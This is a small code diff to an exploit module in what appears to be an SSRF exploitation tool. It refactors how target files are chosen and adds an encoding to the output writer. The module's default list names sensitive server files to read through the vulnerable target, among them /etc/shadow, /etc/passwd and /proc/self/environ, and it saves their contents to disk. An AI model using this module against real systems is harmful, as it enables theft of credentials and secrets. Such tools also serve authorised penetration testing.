@@ -11,19 +11,22 @@ class exploit():
     
     def __init__(self, requester, args):
         logging.info(f"Module '{name}' launched !")
-        self.files = args.targetfiles.split(',') if args.targetfiles != None else [
-            "/etc/passwd", 
-            "/etc/lsb-release", 
-            "/etc/shadow", 
-            "/etc/hosts", 
-            "\/\/etc/passwd", 
-            "/proc/self/environ", 
-            "/proc/self/cmdline", 
-            "/proc/self/cwd/index.php", 
-            "/proc/self/cwd/application.py", 
-            "/proc/self/cwd/main.py", 
-            "/proc/self/exe"
-        ]   
+        if hasattr(args, 'targetfiles') and isinstance(args.targetfiles, str):
+            self.files = args.targetfiles.split(',')
+        else:
+            self.files = [
+                "/etc/passwd",
+                "/etc/lsb-release",
+                "/etc/shadow",
+                "/etc/hosts",
+                "/etc/passwd",
+                "/proc/self/environ",
+                "/proc/self/cmdline",
+                "/proc/self/cwd/index.php",
+                "/proc/self/cwd/application.py",
+                "/proc/self/cwd/main.py",
+                "/proc/self/exe"
+            ]
         self.file_magic = {'elf' : bytes([0x7f, 0x45, 0x4c, 0x46])}
         
         r = requester.do_request(args.param, "")
@@ -54,7 +57,7 @@ class exploit():
                     # Write diff to a file
                     filename = f.replace('\\','_').replace('/','_')
                     logging.info(f"\033[32mWriting file\033[0m : {f} to {directory + '/' + filename}")
-                    with open(directory + "/" + filename, 'w') as f:
+                    with open(directory + "/" + filename, 'w', encoding='utf-8') as f:
                         f.write(diff)
 
         else:
